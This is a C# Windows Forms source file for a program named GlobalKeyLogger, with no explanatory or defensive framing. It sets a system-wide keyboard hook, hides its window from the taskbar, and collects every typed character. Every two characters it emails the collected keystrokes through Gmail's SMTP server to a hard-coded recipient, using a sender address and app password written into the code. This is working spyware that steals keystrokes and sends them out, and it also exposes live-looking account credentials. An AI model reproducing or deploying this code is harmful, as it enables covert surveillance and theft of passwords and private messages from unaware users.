using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace GlobalKeyLogger
{
    public partial class Form1 : Form
    {
        private static StringBuilder buffer = new StringBuilder();
        private static StringBuilder tempBuffer = new StringBuilder();
        private static readonly object bufLock = new object();
        private static IntPtr _hookID = IntPtr.Zero;
        private const int CharacterLimit = 2; // Character limit

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hMod, uint threadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static LowLevelKeyboardProc _proc = HookCallback;

        public Form1()
        {
            InitializeComponent();
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            _hookID = SetHook(_proc);
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)256)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                char keyChar = (char)vkCode;
                // Check if the character is printable
                if (char.IsLetterOrDigit(keyChar) || char.IsPunctuation(keyChar) || char.IsWhiteSpace(keyChar))
                {
                    lock (bufLock)
                    {
                        buffer.Append(keyChar);
                        // Check buffer
                        if (buffer.Length >= CharacterLimit)
                        {
                            // Clear tempBuffer before appending new data
                            tempBuffer.Clear();
                            // Move buffer to temporary variable
                            tempBuffer.Append(buffer);
                            // Clear buffer
                            buffer.Clear();
                            // Send email
                            Form1 formInstance = Application.OpenForms.OfType<Form1>().FirstOrDefault();
                            if (formInstance != null)
                            {
                                formInstance.TrySendAsync(true).GetAwaiter().GetResult(); // Await
                            }
                        }
                    }
                }
                // UpdateDisplay method should be called on Form1 instance
                Form1 form = Application.OpenForms.OfType<Form1>().FirstOrDefault();
                if (form != null)
                {
                    form.UpdateDisplay();
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            // Keylogger started
            await TrySendAsync(true);
        }

        private async Task TrySendAsync(bool force = false)
        {
            string content;
            lock (bufLock) { content = tempBuffer.ToString(); }

            if (string.IsNullOrWhiteSpace(content))
            {
                return;
            }

            try
            {
                await SendEmailAsync("utaha765@gmail.com", "Collected data", content);
                lock (bufLock) tempBuffer.Clear();
            }
            catch (Exception ex)
            {
                // Handle error
            }
        }

        private async Task SendEmailAsync(string to, string subject, string body)
        {
            string smtpUser = "timeywimeyefe@gmail.com";
            string smtpPass = "micc gpcm gcao dqme";

            using (var msg = new System.Net.Mail.MailMessage())
            {
                msg.From = new System.Net.Mail.MailAddress(smtpUser, "App Logger");
                msg.To.Add(new System.Net.Mail.MailAddress(to));
                msg.Subject = subject;
                msg.Body = body;

                using (var client = new System.Net.Mail.SmtpClient("smtp.gmail.com", 587))
                {
                    client.EnableSsl = true;
                    client.Credentials = new NetworkCredential(smtpUser, smtpPass);
                    await client.SendMailAsync(msg);
                }
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            UnhookWindowsHookEx(_hookID);
            base.OnFormClosing(e);
        }

        private void UpdateDisplay()
        {
            lock (bufLock)
            {
                txtDisplay.Text = buffer.ToString();
            }
        }
    }
}
